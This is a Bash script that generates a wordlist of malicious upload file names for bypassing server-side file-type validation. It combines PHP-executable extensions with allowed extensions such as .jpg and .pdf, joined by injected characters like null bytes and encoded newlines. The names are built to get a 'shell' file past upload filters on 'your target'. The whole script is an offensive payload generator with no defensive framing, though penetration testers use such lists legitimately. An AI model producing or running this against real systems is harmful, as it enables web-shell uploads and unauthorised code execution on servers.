# This BASH script will perform character injection to auto generate a wordlist and bypass server-side validations
# This script is by-default for PHP based apps. Please change the extensions list in Line #4 according to the back-end technology being used by your target.
# This script is by-default for apps that allow JPG, PNG, XLS, PDF, GIF files. Please change the allowed extensions list in Line #5 according to the back-end technology being used by your target.

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phtml' '.php7' '.phar'; do # change here the list of extensions according to back-end technology
      for ext1 in '.jpg' '.png' '.xls' '.pdf' '.gif'; do # change here the list of allowed extensions
          echo "shell$char$ext$ext1" >> wordlist.txt
          echo "shell$ext$char$ext1" >> wordlist.txt
          echo "shell$ext1$char$ext" >> wordlist.txt
          echo "shell$ext1$ext$char" >> wordlist.txt
          echo "shell$ext1$ext$char" >> wordlist.txt
      done
    done
done
